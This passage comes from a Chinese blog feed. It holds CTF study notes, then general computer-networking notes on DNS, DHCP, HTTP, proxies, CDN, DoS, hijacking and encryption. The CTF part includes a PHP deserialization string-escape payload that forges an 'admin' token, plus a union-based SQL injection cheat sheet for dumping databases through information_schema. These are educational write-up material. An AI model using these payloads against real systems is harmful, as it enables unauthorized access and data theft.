class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php">看看反序列化的结果<br><span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;O:7:&quot;message&quot;:4:&#123;s:4:&quot;from&quot;;s:1:&quot;a&quot;;s:3:&quot;msg&quot;;s:1:&quot;b&quot;;s:2:&quot;to&quot;;s:135:&quot;loveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveU&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&quot;;s:5:&quot;token&quot;;s:4:&quot;user&quot;;&#125;&#x27;</span>;<br><br>var_dump(unserialize(<span class="hljs-variable">$a</span>));<br><span class="hljs-comment">//反序列化的结果</span><br><span class="hljs-keyword">object</span>(message)<span class="hljs-comment">#2 (4) &#123;</span><br>  [<span class="hljs-string">&quot;from&quot;</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">&quot;a&quot;</span><br>  [<span class="hljs-string">&quot;msg&quot;</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">&quot;b&quot;</span><br>  [<span class="hljs-string">&quot;to&quot;</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">135</span>) <span class="hljs-string">&quot;loveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveU&quot;</span><br>  [<span class="hljs-string">&quot;token&quot;</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">5</span>) <span class="hljs-string">&quot;admin&quot;</span><br>&#125;<br>成功修改<br></code></pre></td></tr></table></figure><h6 id="0x04-PHP处理session"><a href="#0x04-PHP处理session" class="headerlink" title="0x04.PHP处理session"></a>0x04.PHP处理session</h6><p>PHP默认处理session的方式为php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><br>session_start();<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;aaa&#x27;</span>]=<span class="hljs-string">&#x27;bbb&#x27;</span>;<br><span class="hljs-comment">//aaa|s:3:&quot;bbb&quot;;</span><br><br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">user</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$user</span>=<span class="hljs-string">&quot;admin&quot;</span>;<br>&#125;<br><span class="hljs-variable">$u</span>=<span class="hljs-keyword">new</span> user();<br>session_start();<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user&#x27;</span>]=<span class="hljs-variable">$u</span>;<br><span class="hljs-comment">//user|O:4:&quot;user&quot;:1:&#123;s:4:&quot;user&quot;;s:5:&quot;admin&quot;;&#125;</span><br></code></pre></td></tr></table></figure><p>PHP以php_serialize方式处理session</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br>ini_set(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>,<span class="hljs-string">&#x27;php_serialize&#x27;</span>); <span class="hljs-comment">//设置处理方式</span><br>session_start();<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;aaa&#x27;</span>]=<span class="hljs-string">&#x27;bbb&#x27;</span>;<br><span class="hljs-comment">//a:1:&#123;s:3:&quot;aaa&quot;;s:3:&quot;bbb&quot;;&#125;</span><br><br><br><span class="hljs-meta">&lt;?php</span> <br>ini_set(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>,<span class="hljs-string">&#x27;php_serialize&#x27;</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">user</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$user</span>=<span class="hljs-string">&quot;admin&quot;</span>;<br>&#125;<br><span class="hljs-variable">$u</span>=<span class="hljs-keyword">new</span> user();<br>session_start();<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user&#x27;</span>]=<span class="hljs-variable">$u</span>;<br><span class="hljs-comment">//a:1:&#123;s:4:&quot;user&quot;;O:4:&quot;user&quot;:1:&#123;s:4:&quot;user&quot;;s:5:&quot;admin&quot;;&#125;&#125;</span><br></code></pre></td></tr></table></figure><p>0x05.PHP特性</p><p>PHP的函数和类名不区别大小写</p><h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><p>0x00.关于information_schema无权限<br>1)查列数<br>      ?id=-1 order by $number$#<br>2)爆库<br>    ?id=-1 union select 1,group_concat(schema_name),3 from   information_schema.schemata<br>3)爆表<br>    ?id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=’db_name’<br>4)爆字段<br>    ?id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name=’tab_name’<br>5)爆数据<br>    ?id=-1 union select 1,2,xx from 字段名#</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>网络安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>计算机网络-网络分层(二)</title>
    <link href="/2021/10/26/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE(2)/"/>
    <url>/2021/10/26/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE(2)/</url>
    
    <content type="html"><![CDATA[<h1 id="计算机网络-网络分层-二"><a href="#计算机网络-网络分层-二" class="headerlink" title="计算机网络-网络分层(二)"></a>计算机网络-网络分层(二)</h1><span id="more"></span><h1 id="应用层"><a href="#应用层" class="headerlink" title="应用层"></a>应用层</h1><h6 id="应用层常见协议"><a href="#应用层常见协议" class="headerlink" title="应用层常见协议"></a>应用层常见协议</h6><h6 id="超文本传输-HTTP-HTTPS"><a href="#超文本传输-HTTP-HTTPS" class="headerlink" title="超文本传输:HTTP/HTTPS"></a>超文本传输:HTTP/HTTPS</h6><h6 id="文件传输-FTP"><a href="#文件传输-FTP" class="headerlink" title="文件传输:FTP"></a>文件传输:FTP</h6><h6 id="电子邮件-SMTP-POP3-IMAP"><a href="#电子邮件-SMTP-POP3-IMAP" class="headerlink" title="电子邮件:SMTP,POP3,IMAP"></a>电子邮件:SMTP,POP3,IMAP</h6><h6 id="动态主机配置-DHCP"><a href="#动态主机配置-DHCP" class="headerlink" title="动态主机配置:DHCP"></a>动态主机配置:DHCP</h6><h6 id="域名系统-DNS"><a href="#域名系统-DNS" class="headerlink" title="域名系统:DNS"></a>域名系统:DNS</h6><h3 id="1-NDS"><a href="#1-NDS" class="headerlink" title="1.NDS"></a>1.NDS</h3><h6 id="域名-Domain-由于IP地址不便于记忆，且不具有表达特定名称和含义，于是就有了域名-eg-www-baidu-com"><a href="#域名-Domain-由于IP地址不便于记忆，且不具有表达特定名称和含义，于是就有了域名-eg-www-baidu-com" class="headerlink" title="域名(Domain):由于IP地址不便于记忆，且不具有表达特定名称和含义，于是就有了域名(eg:www.baidu.com)"></a>域名(Domain):由于IP地址不便于记忆，且不具有表达特定名称和含义，于是就有了域名(eg:<a href="http://www.baidu.com/">www.baidu.com</a>)</h6><h6 id="为什么直接用域名，不用IP地址"><a href="#为什么直接用域名，不用IP地址" class="headerlink" title="为什么直接用域名，不用IP地址"></a>为什么直接用域名，不用IP地址</h6><h6 id="IP地址固定为4个字节，域名字节数较多，会增加网络负担，浪费流量"><a href="#IP地址固定为4个字节，域名字节数较多，会增加网络负担，浪费流量" class="headerlink" title="IP地址固定为4个字节，域名字节数较多，会增加网络负担，浪费流量"></a>IP地址固定为4个字节，域名字节数较多，会增加网络负担，浪费流量</h6><h6 id="NDS-Domain-Name-System-域名系统"><a href="#NDS-Domain-Name-System-域名系统" class="headerlink" title="NDS(Domain Name System)域名系统"></a>NDS(Domain Name System)域名系统</h6><h6 id="功能-利用DNS协议，可以将域名-baidu-com-解析为对应的IP地址-如220-181-38-13"><a href="#功能-利用DNS协议，可以将域名-baidu-com-解析为对应的IP地址-如220-181-38-13" class="headerlink" title="功能:利用DNS协议，可以将域名(baidu.com)解析为对应的IP地址(如220.181.38.13)"></a>功能:利用DNS协议，可以将域名(baidu.com)解析为对应的IP地址(如220.181.38.13)</h6><h6 id="DNS基于UDP-TCP协议，DNS服务器占用53端口"><a href="#DNS基于UDP-TCP协议，DNS服务器占用53端口" class="headerlink" title="DNS基于UDP/TCP协议，DNS服务器占用53端口"></a>DNS基于UDP/TCP协议，DNS服务器占用53端口</h6><p><img src="https://i.loli.net/2021/10/23/R2TNusyfwdLZ96j.jpg" alt="查看源图像"></p><p><img src="https://i.loli.net/2021/10/23/D3Rdv71erfx2Fmw.png" alt="查看源图像"></p><h6 id="DNS相关终端命令"><a href="#DNS相关终端命令" class="headerlink" title="DNS相关终端命令"></a>DNS相关终端命令</h6><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">ipconfig <span class="hljs-string">/displaydns</span>  <span class="hljs-string">//</span>查看DNS缓存<br>ipconfig <span class="hljs-string">/flushdns</span>  <span class="hljs-string">//</span>清空DNS缓存<br>ping 域名<br>nslookup 域名<br></code></pre></td></tr></table></figure><h3 id="DHCP协议"><a href="#DHCP协议" class="headerlink" title="DHCP协议"></a>DHCP协议</h3><h6 id="Dynamic-Host-Configuration-Protocol-即为动态主机配置协议"><a href="#Dynamic-Host-Configuration-Protocol-即为动态主机配置协议" class="headerlink" title="Dynamic Host Configuration Protocol 即为动态主机配置协议"></a>Dynamic Host Configuration Protocol 即为动态主机配置协议</h6><h6 id="IP地址的分配"><a href="#IP地址的分配" class="headerlink" title="IP地址的分配"></a>IP地址的分配</h6><h6 id="IP地址按照分配方式可分为静态IP地址-动态IP地址"><a href="#IP地址按照分配方式可分为静态IP地址-动态IP地址" class="headerlink" title="IP地址按照分配方式可分为静态IP地址/动态IP地址"></a>IP地址按照分配方式可分为静态IP地址/动态IP地址</h6><h6 id="静态IP地址"><a href="#静态IP地址" class="headerlink" title="静态IP地址"></a>静态IP地址</h6><h6 id="1-手动设置"><a href="#1-手动设置" class="headerlink" title="1.手动设置"></a>1.手动设置</h6><h6 id="2-使用场景-不方便挪动的及其，服务器等"><a href="#2-使用场景-不方便挪动的及其，服务器等" class="headerlink" title="2.使用场景:不方便挪动的及其，服务器等"></a>2.使用场景:不方便挪动的及其，服务器等</h6><h6 id="动态IP地址"><a href="#动态IP地址" class="headerlink" title="动态IP地址"></a>动态IP地址</h6><h6 id="1-从DHCP服务器自动获取IP地址"><a href="#1-从DHCP服务器自动获取IP地址" class="headerlink" title="1.从DHCP服务器自动获取IP地址"></a>1.从DHCP服务器自动获取IP地址</h6><h6 id="2-使用场景-移动设备，手机等"><a href="#2-使用场景-移动设备，手机等" class="headerlink" title="2.使用场景:移动设备，手机等"></a>2.使用场景:移动设备，手机等</h6><h6 id="DHCP-分配IP地址的四个阶段"><a href="#DHCP-分配IP地址的四个阶段" class="headerlink" title="DHCP-分配IP地址的四个阶段"></a>DHCP-分配IP地址的四个阶段</h6><h6 id="1-DISCOVER-发现服务器"><a href="#1-DISCOVER-发现服务器" class="headerlink" title="1.DISCOVER-发现服务器"></a>1.DISCOVER-发现服务器</h6><h6 id="2-OFFER-提供IP地址租用服务"><a href="#2-OFFER-提供IP地址租用服务" class="headerlink" title="2.OFFER-提供IP地址租用服务"></a>2.OFFER-提供IP地址租用服务</h6><h6 id="3-REQUEST-选择IP地址"><a href="#3-REQUEST-选择IP地址" class="headerlink" title="3.REQUEST-选择IP地址"></a>3.REQUEST-选择IP地址</h6><h6 id="4-ACKNOWLEDGE-确认租用IP"><a href="#4-ACKNOWLEDGE-确认租用IP" class="headerlink" title="4.ACKNOWLEDGE-确认租用IP"></a>4.ACKNOWLEDGE-确认租用IP</h6><h3 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h3><h6 id="Hyper-Text-Transfer-Protocol，超文本传输协议"><a href="#Hyper-Text-Transfer-Protocol，超文本传输协议" class="headerlink" title="Hyper Text Transfer Protocol，超文本传输协议"></a>Hyper Text Transfer Protocol，超文本传输协议</h6><p><img src="https://i.loli.net/2021/10/23/m7OcQS2FNgptJiV.png" alt="查看源图像"></p><p><img src="https://i.loli.net/2021/10/24/yfPEUH7RF4veIpS.png" alt="image-20211024100042678"></p><h6 id="官方文档-ABNF-RFC文档"><a href="#官方文档-ABNF-RFC文档" class="headerlink" title="官方文档:ABNF/RFC文档"></a>官方文档:ABNF/RFC文档</h6><h6 id="URL编码"><a href="#URL编码" class="headerlink" title="URL编码"></a>URL编码</h6><h6 id="URL中出现了特殊字符-比如中文，空格-，需要进行编码"><a href="#URL中出现了特殊字符-比如中文，空格-，需要进行编码" class="headerlink" title="URL中出现了特殊字符(比如中文，空格)，需要进行编码"></a>URL中出现了特殊字符(比如中文，空格)，需要进行编码</h6><h6 id="在浏览器地址栏输入URL时，是采用UTF-8编码"><a href="#在浏览器地址栏输入URL时，是采用UTF-8编码" class="headerlink" title="在浏览器地址栏输入URL时，是采用UTF-8编码"></a>在浏览器地址栏输入URL时，是采用UTF-8编码</h6><h6 id="xshell-telnet"><a href="#xshell-telnet" class="headerlink" title="xshell+telnet"></a>xshell+telnet</h6><h6 id="面向报文与服务器交互"><a href="#面向报文与服务器交互" class="headerlink" title="面向报文与服务器交互"></a>面向报文与服务器交互</h6><h6 id="可直接发送报文给服务器，从而检验报文的合法性"><a href="#可直接发送报文给服务器，从而检验报文的合法性" class="headerlink" title="可直接发送报文给服务器，从而检验报文的合法性"></a>可直接发送报文给服务器，从而检验报文的合法性</h6><h6 id="请求方法"><a href="#请求方法" class="headerlink" title="请求方法"></a>请求方法</h6><h6 id="GET-HEAD-POST-PUT-DELETE-CONNECT-OPTIONS-TRACE"><a href="#GET-HEAD-POST-PUT-DELETE-CONNECT-OPTIONS-TRACE" class="headerlink" title="GET/HEAD/POST/PUT/DELETE/CONNECT/OPTIONS/TRACE"></a>GET/HEAD/POST/PUT/DELETE/CONNECT/OPTIONS/TRACE</h6><h5 id="GET-常用于读取的操作，请求参数直接拼接在URL后面-浏览器对URL长度有限定"><a href="#GET-常用于读取的操作，请求参数直接拼接在URL后面-浏览器对URL长度有限定" class="headerlink" title="GET:常用于读取的操作，请求参数直接拼接在URL后面(浏览器对URL长度有限定)"></a>GET:常用于读取的操作，请求参数直接拼接在URL后面(浏览器对URL长度有限定)</h5><h6 id="POST-常用于添加，修改，删除的操作，请求参数放在请求体中-没有长度限定"><a href="#POST-常用于添加，修改，删除的操作，请求参数放在请求体中-没有长度限定" class="headerlink" title="POST:常用于添加，修改，删除的操作，请求参数放在请求体中(没有长度限定)"></a>POST:常用于添加，修改，删除的操作，请求参数放在请求体中(没有长度限定)</h6><h6 id="HEAD-请求得到与GET相同的响应，没有响应体"><a href="#HEAD-请求得到与GET相同的响应，没有响应体" class="headerlink" title="HEAD:请求得到与GET相同的响应，没有响应体"></a>HEAD:请求得到与GET相同的响应，没有响应体</h6><h6 id="头部字段-详情见维基百科https-zh-wikipedia-org-wiki-HTTP-E5-A4-B4-E5-AD-97-E6-AE-B5"><a href="#头部字段-详情见维基百科https-zh-wikipedia-org-wiki-HTTP-E5-A4-B4-E5-AD-97-E6-AE-B5" class="headerlink" title="头部字段(详情见维基百科https://zh.wikipedia.org/wiki/HTTP%E5%A4%B4%E5%AD%97%E6%AE%B5)"></a>头部字段(详情见维基百科<a href="https://zh.wikipedia.org/wiki/HTTP%E5%A4%B4%E5%AD%97%E6%AE%B5">https://zh.wikipedia.org/wiki/HTTP%E5%A4%B4%E5%AD%97%E6%AE%B5</a>)</h6><h3 id="请求头字段"><a href="#请求头字段" class="headerlink" title="请求头字段"></a>请求头字段</h3><table><thead><tr><th align="center">首部字段名</th><th align="left">说明</th></tr></thead><tbody><tr><td align="center">Accept</td><td align="left">用户代理可处理的媒体类型</td></tr><tr><td align="center">Accept-Charset</td><td align="left">优先的字符集</td></tr><tr><td align="center">Accept-Encoding</td><td align="left">优先的内容编码</td></tr><tr><td align="center">Accept-Language</td><td align="left">优先的语言</td></tr><tr><td align="center">Host</td><td align="left">指定资源所在服务器</td></tr><tr><td align="center">If-Match</td><td align="left">比较实体标记（ETag）</td></tr><tr><td align="center">If-Modified-Since</td><td align="left">比较资源的更新时间</td></tr><tr><td align="center">If-None-Match</td><td align="left">比较实体标记（与If-Match相反）</td></tr><tr><td align="center">Referer</td><td align="left">对请求中URI的原始获取方</td></tr><tr><td align="center">User-Agent</td><td align="left">Http客户端程序的信息</td></tr></tbody></table><h3 id="响应头字段"><a href="#响应头字段" class="headerlink" title="响应头字段"></a>响应头字段</h3><table><thead><tr><th align="center">首部字段名</th><th align="left">说明</th></tr></thead><tbody><tr><td align="center">Accept-Range</td><td align="left">是否接受字节范围请求</td></tr><tr><td align="center">ETag</td><td align="left">资源的匹配信息</td></tr><tr><td align="center">Location</td><td align="left">另客户端重定向至指定URI</td></tr><tr><td align="center">Server</td><td align="left">Http服务器的安装信息</td></tr><tr><td align="center">Vary</td><td align="left">代理服务器缓存的管理信息</td></tr></tbody></table><h3 id="实体头字段"><a href="#实体头字段" class="headerlink" title="实体头字段"></a>实体头字段</h3><table><thead><tr><th align="center">首部字段名</th><th align="left">说明</th></tr></thead><tbody><tr><td align="center">Allow</td><td align="left">资源可支持的Http方法</td></tr><tr><td align="center">Content-Encoding</td><td align="left">实体主体适用的编码方式</td></tr><tr><td align="center">Content-Language</td><td align="left">实体主体的自然语言</td></tr><tr><td align="center">Content-Length</td><td align="left">实体主体的大小（字节）</td></tr><tr><td align="center">Content-Location</td><td align="left">替代对应资源的URI</td></tr><tr><td align="center">Content-Type</td><td align="left">实体主体的媒体类型</td></tr><tr><td align="center">Expires</td><td align="left">实体主体过期的日期时间</td></tr><tr><td align="center">Last-Modified</td><td align="left">资源的最后修改日期时间</td></tr></tbody></table><h3 id="通用头字段"><a href="#通用头字段" class="headerlink" title="通用头字段"></a>通用头字段</h3><table><thead><tr><th align="center">首部字段名</th><th align="left">说明</th></tr></thead><tbody><tr><td align="center">Cache-Control</td><td align="left">控制缓存的行为</td></tr><tr><td align="center">Connextion</td><td align="left">逐跳首部、连接的管理</td></tr><tr><td align="center">Date</td><td align="left">创建报文的日期时间</td></tr><tr><td align="center">Pragma</td><td align="left">报文指令</td></tr><tr><td align="center">Transfer-Encoding</td><td align="left">指定报文主体的传输编码方式</td></tr></tbody></table><h3 id="HTTP状态码"><a href="#HTTP状态码" class="headerlink" title="HTTP状态码"></a>HTTP状态码</h3><table><thead><tr><th align="left"></th><th align="center">类别</th><th>原因短语</th></tr></thead><tbody><tr><td align="left">1XX</td><td align="center">Informational（信息性状态码）</td><td>接收的请求正在处理</td></tr><tr><td align="left">2XX</td><td align="center">Success（成功状态码）</td><td>请求正常处理完毕</td></tr><tr><td align="left">3XX</td><td align="center">Redirection（重定向）</td><td>需要进行附加操作以完成请求</td></tr><tr><td align="left">4XX</td><td align="center">Client Error（客户端错误状态码）</td><td>服务器无法处理请求</td></tr><tr><td align="left">5XX</td><td align="center">Server Error（服务器错误状态码）</td><td>服务器处理请求出错</td></tr></tbody></table><h3 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h3><h6 id="在客户端-浏览器-存储一些数据"><a href="#在客户端-浏览器-存储一些数据" class="headerlink" title="在客户端(浏览器)存储一些数据"></a>在客户端(浏览器)存储一些数据</h6><h6 id="服务器可以返回cookie交给客户端去存储"><a href="#服务器可以返回cookie交给客户端去存储" class="headerlink" title="服务器可以返回cookie交给客户端去存储"></a>服务器可以返回cookie交给客户端去存储</h6><h3 id="session"><a href="#session" class="headerlink" title="session"></a>session</h3><h6 id="在服务器中存储一些数据"><a href="#在服务器中存储一些数据" class="headerlink" title="在服务器中存储一些数据"></a>在服务器中存储一些数据</h6><h3 id="代理服务器"><a href="#代理服务器" class="headerlink" title="代理服务器"></a>代理服务器</h3><h6 id="特点"><a href="#特点" class="headerlink" title="特点:"></a>特点:</h6><h6 id="1-本身不产生内容"><a href="#1-本身不产生内容" class="headerlink" title="1.本身不产生内容"></a>1.本身不产生内容</h6><h6 id="2-处于中间位置转发上下游的请求和响应"><a href="#2-处于中间位置转发上下游的请求和响应" class="headerlink" title="2.处于中间位置转发上下游的请求和响应"></a>2.处于中间位置转发上下游的请求和响应</h6><h6 id="面向下游的客户端-他是服务器"><a href="#面向下游的客户端-他是服务器" class="headerlink" title="面向下游的客户端:他是服务器"></a>面向下游的客户端:他是服务器</h6><h6 id="面向上游的服务端-他是客户端"><a href="#面向上游的服务端-他是客户端" class="headerlink" title="面向上游的服务端:他是客户端"></a>面向上游的服务端:他是客户端</h6><p><img src="https://i.loli.net/2021/10/24/kRhMbXSm9PeZ1Lu.jpg" alt="代理服务器 的图像结果"></p><h6 id="正向代理-代理的对象是客户端"><a href="#正向代理-代理的对象是客户端" class="headerlink" title="正向代理(代理的对象是客户端)"></a>正向代理(代理的对象是客户端)</h6><h6 id="隐藏客户端身份"><a href="#隐藏客户端身份" class="headerlink" title="隐藏客户端身份"></a>隐藏客户端身份</h6><h6 id="绕过防火墙-突破访问限制"><a href="#绕过防火墙-突破访问限制" class="headerlink" title="绕过防火墙(突破访问限制)"></a>绕过防火墙(突破访问限制)</h6><p><img src="https://i.loli.net/2021/10/24/T24uGtcZ7RYglnV.png" alt="查看源图像"></p><h6 id="Internet访问控制"><a href="#Internet访问控制" class="headerlink" title="Internet访问控制"></a>Internet访问控制</h6><h6 id="数据过滤"><a href="#数据过滤" class="headerlink" title="数据过滤"></a>数据过滤</h6><h6 id="反向代理-代理的对象是服务端"><a href="#反向代理-代理的对象是服务端" class="headerlink" title="反向代理(代理的对象是服务端)"></a>反向代理(代理的对象是服务端)</h6><h6 id="隐藏服务器身份"><a href="#隐藏服务器身份" class="headerlink" title="隐藏服务器身份"></a>隐藏服务器身份</h6><h6 id="安全防护"><a href="#安全防护" class="headerlink" title="安全防护"></a>安全防护</h6><h6 id="负载均衡"><a href="#负载均衡" class="headerlink" title="负载均衡"></a>负载均衡</h6><h3 id="CDN"><a href="#CDN" class="headerlink" title="CDN"></a>CDN</h3><h6 id="content-delivery-network-内容分发网络"><a href="#content-delivery-network-内容分发网络" class="headerlink" title="content delivery network ,内容分发网络"></a>content delivery network ,内容分发网络</h6><h6 id="功能-利用更靠近每位用户的服务器，更快更可靠地传输资源文件给用户"><a href="#功能-利用更靠近每位用户的服务器，更快更可靠地传输资源文件给用户" class="headerlink" title="功能:利用更靠近每位用户的服务器，更快更可靠地传输资源文件给用户"></a>功能:利用更靠近每位用户的服务器，更快更可靠地传输资源文件给用户</h6><p><img src="https://i.loli.net/2021/10/24/DHlYtypFk528u1s.png" alt="查看源图像"></p><h4 id="ARP攻击-网络层"><a href="#ARP攻击-网络层" class="headerlink" title="ARP攻击(网络层)"></a>ARP攻击(网络层)</h4><h6 id="中间人攻击，攻击主机作为被攻击主机间的中间人，破坏其正常通信"><a href="#中间人攻击，攻击主机作为被攻击主机间的中间人，破坏其正常通信" class="headerlink" title="中间人攻击，攻击主机作为被攻击主机间的中间人，破坏其正常通信"></a>中间人攻击，攻击主机作为被攻击主机间的中间人，破坏其正常通信</h6><h4 id="DoS攻击"><a href="#DoS攻击" class="headerlink" title="DoS攻击"></a>DoS攻击</h4><h6 id="使目标电脑的网络或者系统资源耗尽，使服务暂时中断或者停止，导致正常用户无法访问"><a href="#使目标电脑的网络或者系统资源耗尽，使服务暂时中断或者停止，导致正常用户无法访问" class="headerlink" title="使目标电脑的网络或者系统资源耗尽，使服务暂时中断或者停止，导致正常用户无法访问"></a>使目标电脑的网络或者系统资源耗尽，使服务暂时中断或者停止，导致正常用户无法访问</h6><h6 id="DoS攻击分为2大类"><a href="#DoS攻击分为2大类" class="headerlink" title="DoS攻击分为2大类"></a>DoS攻击分为2大类</h6><h6 id="1-带宽消耗型-UDP洪水攻击-ICMP洪水攻击"><a href="#1-带宽消耗型-UDP洪水攻击-ICMP洪水攻击" class="headerlink" title="1.带宽消耗型:UDP洪水攻击,ICMP洪水攻击"></a>1.带宽消耗型:UDP洪水攻击,ICMP洪水攻击</h6><h6 id="2-资源消耗性-SYN洪水攻击-发送一系列SYN请求，因收不到第三次握手导致服务器等待，消耗资源-，LAND攻击"><a href="#2-资源消耗性-SYN洪水攻击-发送一系列SYN请求，因收不到第三次握手导致服务器等待，消耗资源-，LAND攻击" class="headerlink" title="2.资源消耗性:SYN洪水攻击(发送一系列SYN请求，因收不到第三次握手导致服务器等待，消耗资源)，LAND攻击"></a>2.资源消耗性:SYN洪水攻击(发送一系列SYN请求，因收不到第三次握手导致服务器等待，消耗资源)，LAND攻击</h6><h4 id="DDoS攻击"><a href="#DDoS攻击" class="headerlink" title="DDoS攻击"></a>DDoS攻击</h4><h6 id="使用网络上两个或多个被攻陷的电脑作为僵尸-肉鸡向特定的目标进行DoS攻击"><a href="#使用网络上两个或多个被攻陷的电脑作为僵尸-肉鸡向特定的目标进行DoS攻击" class="headerlink" title="使用网络上两个或多个被攻陷的电脑作为僵尸/肉鸡向特定的目标进行DoS攻击"></a>使用网络上两个或多个被攻陷的电脑作为僵尸/肉鸡向特定的目标进行DoS攻击</h6><h4 id="DNS劫持-应用层"><a href="#DNS劫持-应用层" class="headerlink" title="DNS劫持(应用层)"></a>DNS劫持(应用层)</h4><h6 id="攻击者篡改某个域名的解析结果，使指向该域名的IP变成了另一个IP"><a href="#攻击者篡改某个域名的解析结果，使指向该域名的IP变成了另一个IP" class="headerlink" title="攻击者篡改某个域名的解析结果，使指向该域名的IP变成了另一个IP"></a>攻击者篡改某个域名的解析结果，使指向该域名的IP变成了另一个IP</h6><h4 id="HTTP劫持"><a href="#HTTP劫持" class="headerlink" title="HTTP劫持"></a>HTTP劫持</h4><h6 id="对HTTP数据包进行拦截处理，插入恶意js代码"><a href="#对HTTP数据包进行拦截处理，插入恶意js代码" class="headerlink" title="对HTTP数据包进行拦截处理，插入恶意js代码"></a>对HTTP数据包进行拦截处理，插入恶意js代码</h6><h6 id="HTTP协议的安全问题"><a href="#HTTP协议的安全问题" class="headerlink" title="HTTP协议的安全问题"></a>HTTP协议的安全问题</h6><h6 id="HTTP协议默认是明文传输的，因此会有很大安全隐患"><a href="#HTTP协议默认是明文传输的，因此会有很大安全隐患" class="headerlink" title="HTTP协议默认是明文传输的，因此会有很大安全隐患"></a>HTTP协议默认是明文传输的，因此会有很大安全隐患</h6><h6 id="单向散列函数"><a href="#单向散列函数" class="headerlink" title="单向散列函数"></a>单向散列函数</h6><h6 id="如何加密解密-加密算法-秘钥"><a href="#如何加密解密-加密算法-秘钥" class="headerlink" title="如何加密解密(加密算法+秘钥)"></a>如何加密解密(加密算法+秘钥)</h6><p><img src="https://i.loli.net/2021/10/25/4eKr79qAPS8dJLp.jpg" alt="查看源图像"></p><h6 id="对称加密-加密和解密用的秘钥相同"><a href="#对称加密-加密和解密用的秘钥相同" class="headerlink" title="对称加密:加密和解密用的秘钥相同"></a>对称加密:加密和解密用的秘钥相同</h6><h6 id="常见对称加密算法"><a href="#常见对称加密算法" class="headerlink" title="常见对称加密算法:"></a>常见对称加密算法:</h6><ol><li>DES加密</li><li>3DES加密</li><li>AES加密</li></ol><h6 id="秘钥配送问题-如何解决"><a href="#秘钥配送问题-如何解决" class="headerlink" title="秘钥配送问题(如何解决)"></a>秘钥配送问题(如何解决)</h6><ol><li>事先共享秘钥(比如私下共享)</li><li>秘钥配送中心</li><li>Diffie-Hellam配送</li><li>非对称加密(公私钥加密)</li></ol><h6 id="非对称加密-公钥密码-加密和解密秘钥不同-复杂-gt-安全-gt-加解密速度快"><a href="#非对称加密-公钥密码-加密和解密秘钥不同-复杂-gt-安全-gt-加解密速度快" class="headerlink" title="非对称加密(公钥密码):加密和解密秘钥不同(复杂 -&gt; 安全 -&gt; 加解密速度快)"></a>非对称加密(公钥密码):加密和解密秘钥不同(复杂 -&gt; 安全 -&gt; 加解密速度快)</h6><ol><li>RSA加密</li></ol><p><img src="https://i.loli.net/2021/10/25/i3CaodVRlJtFuGN.png" alt="image-20211025202735696"></p><h4 id="混合密码系统"><a href="#混合密码系统" class="headerlink" title="混合密码系统"></a>混合密码系统</h4><h6 id="是将对称加密和非对称加密的优势相结合"><a href="#是将对称加密和非对称加密的优势相结合" class="headerlink" title="是将对称加密和非对称加密的优势相结合"></a>是将对称加密和非对称加密的优势相结合</h6><p><img 